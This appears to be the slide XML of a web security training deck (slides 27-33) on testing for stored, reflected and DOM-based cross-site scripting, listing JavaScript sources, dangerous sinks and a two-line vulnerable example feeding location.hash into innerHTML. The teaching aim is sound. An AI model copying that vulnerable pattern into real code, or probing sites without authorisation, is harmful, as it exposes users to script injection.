                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2CBA65EF-2A7F-E6F7-A495-E296CF808F41}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Determine the Context</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1E16C423-98F1-9A0F-CB35-7B07D0C00529}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>27</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3591714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E273AA-38D0-EA2C-8FA1-E1871337AC90}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Look for functionality that stores data:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Comments </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Reviews </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Forum posts </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>User profiles </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Support tickets </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Submit benign test content and check whether it is displayed later.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Process:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Enter test input. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Save it. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Revisit the page. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>View the content as another user role (if authorized). </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>If input is stored and rendered without proper encoding, it may indicate a Stored XSS risk.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E77D3B60-64A0-5903-4D10-DFD8650317C9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Test for Stored XSS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{12D677C5-C777-437E-F280-BFAB39B970B9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>28</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4040837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7FE584-F1A7-B6B7-6BDA-FB48A71ACEE1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Look for user input immediately returned in the response.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Typical locations:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Search functionality </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Error messages </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>URL parameters </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Filter options </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Example:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>search?q</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=test</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Observe whether the application reflects the value in the page.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DD087C72-26A1-A544-7F53-635B732A629B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Test for Reflected XSS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B6430C30-B80C-FB87-706A-66A317548802}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>29</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1897752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C6AC92-77D7-989D-349E-D71FC2702334}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="85000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DOM XSS requires examining client-side JavaScript.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Look for JavaScript reading values from sources such as:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>location.href</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>location.search</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>location.hash</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>document.cookie</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>document.referrer</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>localStorage</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sessionStorage</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>window.name</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Then determine whether those values are written into dangerous sinks such as:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>innerHTML</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>outerHTML</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>document.write</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>eval</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>setTimeout</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>setInterval</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>insertAdjacentHTML</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The key concept is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>source to sink flow</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AD93C11A-1138-074C-0DB9-F7C15C94ACA2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Test for DOM-Based XSS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{20E5416C-37AE-9BBF-430B-E48CCA837A39}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>30</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="890670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F9F9C4-5103-3FDB-D1F7-263E5575DA69}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>For DOM XSS, trace data flow:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Source</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>   ↓</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>JavaScript Processing</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>   ↓</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Sink</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Example:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>var data = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>location.hash</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>;</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>output.innerHTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = data;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Here:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Source: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>location.hash</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Sink: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>innerHTML</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>This pattern deserves closer review because untrusted data reaches a dangerous sink.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9E8DA5C7-7600-69B9-0C65-97170FD04355}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Perform Source and Sink Analysis</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{065CFE1F-ECBB-EEC4-84A8-8A497876EDF4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>31</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3884331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545A5F-266E-ABB8-D888-A3FEB302F396}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Use browser developer tools to inspect:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>HTML Source</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Check where input appears.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>DOM Tree</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Determine whether JavaScript modifies page content dynamically.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Network Requests</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Inspect parameters, headers, and responses.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Console</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Watch for JavaScript errors and DOM manipulations.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F6D0C448-E803-A6F2-9FFD-507F160AB6E7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Examine Browser Developer Tools</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A57E75F3-5622-B848-C599-13DC7648E5B3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>32</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1140968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92240D-FC39-78A0-E2AD-F86AD3C718EA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Applications often sanitize or encode characters.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Observe how special characters are handled:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A14B68E1-74E6-5FA7-B242-33B213C9C303}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Check Input Filters and Encoding</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{02673EB5-ABA6-08A0-3D73-B0E129AC76E1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>33</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="7" name="Table 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{220EC357-2F2D-733F-A1DA-0C3008E528DF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2719820040"/>
              </p:ext>
            </p:extLst>
